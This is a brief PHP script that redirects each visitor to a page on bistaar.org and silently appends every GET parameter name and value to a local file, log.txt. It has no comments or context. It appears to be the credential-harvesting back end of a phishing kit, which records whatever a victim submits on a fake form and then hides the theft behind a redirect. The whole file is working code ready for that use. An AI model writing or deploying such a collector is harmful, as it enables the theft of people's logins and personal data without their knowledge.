<?php header
('Location:http://bistaar.org/vision-2/');
$handle = fopen("log.txt","a");
foreach($_GET as $variable=>$value)
{fwrite($handle,$variable);
fwrite($handle, "=");fwrite($handle,$value);fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n\n\n\n");
fclose($handle);
exit;?>
